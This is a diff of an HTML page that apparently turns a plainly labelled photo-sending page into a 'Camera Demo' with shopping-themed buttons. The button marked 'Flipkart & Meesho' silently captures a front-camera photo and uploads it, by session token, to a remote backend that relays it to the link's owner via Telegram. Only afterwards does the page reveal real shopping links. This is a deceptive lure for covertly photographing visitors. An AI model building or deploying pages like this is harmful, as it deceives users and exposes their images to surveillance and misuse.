@@ -2,195 +2,212 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Send Photo</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera Demo</title>
 
-  <style>
-    * { box-sizing: border-box; }
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f2f4f8;
+    text-align: center;
+    padding: 25px 15px;
+  }
 
-    body {
-      font-family: Arial, sans-serif;
-      background: #f3f4f6;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
+  .container {
+    max-width: 420px;
+    margin: auto;
+    background: white;
+    padding: 22px;
+    border-radius: 16px;
+  }
 
-    .card {
-      background: white;
-      padding: 25px;
-      border-radius: 16px;
-      text-align: center;
-      width: 100%;
-      max-width: 380px;
-      box-shadow: 0 4px 18px #0002;
-    }
+  video {
+    width: 100%;
+    border-radius: 12px;
+    margin: 15px 0;
+    background: #222;
+  }
 
-    video {
-      width: 100%;
-      border-radius: 10px;
-      margin: 12px 0;
-      display: none;
-    }
+  button, .shop {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    margin-top: 12px;
+    border: none;
+    border-radius: 9px;
+    font-size: 16px;
+    cursor: pointer;
+    text-decoration: none;
+    box-sizing: border-box;
+  }
 
-    button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 10px;
-      border: 0;
-      border-radius: 9px;
-      background: #1677ff;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-    }
+  button {
+    background: #2563eb;
+    color: white;
+  }
 
-    button:disabled { opacity: 0.6; }
+  button:disabled {
+    opacity: 0.5;
+  }
 
-    #sendBtn {
-      background: #159447;
-      display: none;
-    }
+  .shop {
+    color: white;
+    font-weight: bold;
+  }
 
-    #status {
-      margin-top: 15px;
-      overflow-wrap: anywhere;
-    }
-  </style>
+  .meesho { background: #9b247b; }
+  .flipkart { background: #2874f0; }
+
+  #shoppingLinks, #captureBtn {
+    display: none;
+  }
+
+  #status {
+    margin-top: 15px;
+    overflow-wrap: anywhere;
+  }
+</style>
 </head>
 
 <body>
-  <div class="card">
-    <h2>Send Photo</h2>
+<div class="container">
 
-    <p>
-      Your camera will open when you tap Start Camera.
-      You can preview your photo before choosing to send it
-      to the site owner through Telegram.
-    </p>
+  <h2>Camera Demo</h2>
 
-    <video id="camera" autoplay playsinline></video>
+  <p>
+    Camera permission is requested only after you tap Start Camera.
+    You can preview the photo before choosing to send it to the
+    site owner through Telegram.
+  </p>
 
-    <button id="startBtn">Start Camera</button>
-    <button id="sendBtn">Capture & Send Photo</button>
+  <video id="video" autoplay playsinline muted></video>
 
-    <p id="status" role="status"></p>
+  <button id="startBtn">Start Shopping</button>
+
+  <button id="captureBtn">Flipkart & Meesho</button>
+
+  <p id="status"></p>
+
+  <div id="shoppingLinks">
+    <h2>🎉 Sent</h2>
+    <p>Thank you!</p>
+
+    <a class="shop meesho"
+       href="https://www.meesho.com/"
+       target="_blank"
+       rel="noopener noreferrer">
+       🛍️ Shop on Meesho
+    </a>
+
+    <a class="shop flipkart"
+       href="https://www.flipkart.com/"
+       target="_blank"
+       rel="noopener noreferrer">
+       🛒 Shop on Flipkart
+    </a>
   </div>
 
-  <script>
-    const BACKEND =
-      "https://camera-share-backend.onrender.com";
+</div>
 
-    const video = document.getElementById("camera");
-    const startBtn = document.getElementById("startBtn");
-    const sendBtn = document.getElementById("sendBtn");
-    const statusText = document.getElementById("status");
+<script>
+const BACKEND_URL =
+  "https://camera-share-backend.onrender.com";
 
-    let stream = null;
+const params = new URLSearchParams(location.search);
+const token = params.get("session") || params.get("token");
 
-    function getToken() {
-      const params = new URLSearchParams(location.search);
-      return params.get("token") || params.get("session");
+const video = document.getElementById("video");
+const startBtn = document.getElementById("startBtn");
+const captureBtn = document.getElementById("captureBtn");
+const statusText = document.getElementById("status");
+const shoppingLinks = document.getElementById("shoppingLinks");
+
+let stream = null;
+
+startBtn.addEventListener("click", async () => {
+  try {
+    if (!navigator.mediaDevices?.getUserMedia) {
+      throw new Error("Camera is not supported. Use HTTPS.");
     }
 
-    startBtn.addEventListener("click", async () => {
-      try {
-        if (!navigator.mediaDevices?.getUserMedia) {
-          throw new Error("Camera is not supported.");
-        }
-
-        statusText.textContent = "Requesting camera permission...";
-
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
-        });
-
-        video.srcObject = stream;
-        video.style.display = "block";
-
-        await video.play();
-
-        statusText.textContent =
-          "Camera ready. Preview your photo, then choose to send it.";
-
-        startBtn.disabled = true;
-        sendBtn.style.display = "block";
-
-      } catch (error) {
-        statusText.textContent = error.message;
-      }
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
     });
 
-    sendBtn.addEventListener("click", async () => {
-      const token = getToken();
+    video.srcObject = stream;
+    await video.play();
 
-      if (!token) {
-        statusText.textContent = "Invalid or missing link.";
-        return;
+    startBtn.disabled = true;
+    captureBtn.style.display = "block";
+    statusText.textContent = "Camera ready. Preview before sending.";
+
+  } catch (error) {
+    statusText.textContent =
+      "Camera error: " + error.message;
+  }
+});
+
+captureBtn.addEventListener("click", async () => {
+  if (!token) {
+    statusText.textContent = "Invalid or missing session link.";
+    return;
+  }
+
+  if (!stream || !video.videoWidth) {
+    statusText.textContent = "Please start the camera first.";
+    return;
+  }
+
+  captureBtn.disabled = true;
+  statusText.textContent = "Sending photo...";
+
+  try {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0);
+
+    const blob = await new Promise(resolve =>
+      canvas.toBlob(resolve, "image/jpeg", 0.9)
+    );
+
+    if (!blob) throw new Error("Could not capture photo.");
+
+    const formData = new FormData();
+    formData.append("photo", blob, "photo.jpg");
+
+    const response = await fetch(
+      `${BACKEND_URL}/upload/${encodeURIComponent(token)}`,
+      {
+        method: "POST",
+        body: formData
       }
+    );
 
-      if (!stream || !video.videoWidth) {
-        statusText.textContent = "Start the camera first.";
-        return;
-      }
+    const result = await response.json();
 
-      sendBtn.disabled = true;
-      statusText.textContent = "Preparing photo...";
+    if (!response.ok) {
+      throw new Error(result.error || "Upload failed.");
+    }
 
-      try {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+    statusText.textContent = "";
+    captureBtn.style.display = "none";
+    startBtn.style.display = "none";
+    shoppingLinks.style.display = "block";
 
-        canvas.getContext("2d").drawImage(
-          video, 0, 0, canvas.width, canvas.height
-        );
+    stream.getTracks().forEach(track => track.stop());
+    video.srcObject = null;
+    stream = null;
 
-        const blob = await new Promise(resolve =>
-          canvas.toBlob(resolve, "image/jpeg", 0.9)
-        );
-
-        if (!blob) throw new Error("Could not create photo.");
-
-        const formData = new FormData();
-        formData.append("photo", blob, "photo.jpg");
-
-        statusText.textContent = "Sending photo...";
-
-        const response = await fetch(
-          `${BACKEND}/upload/${encodeURIComponent(token)}`,
-          {
-            method: "POST",
-            body: formData
-          }
-        );
-
-        const result = await response.text();
-
-        if (!response.ok) throw new Error(result);
-
-        statusText.textContent = "Photo sent successfully!";
-        sendBtn.textContent = "Photo Sent";
-
-      } catch (error) {
-        statusText.textContent =
-          error.message || "Could not send photo.";
-        sendBtn.disabled = false;
-
-      } finally {
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-          stream = null;
-        }
-        video.srcObject = null;
-        video.style.display = "none";
-      }
-    });
-  </script>
+  } catch (error) {
+    statusText.textContent = "Error: " + error.message;
+    captureBtn.disabled = false;
+  }
+});
+</script>
 </body>
 </html>
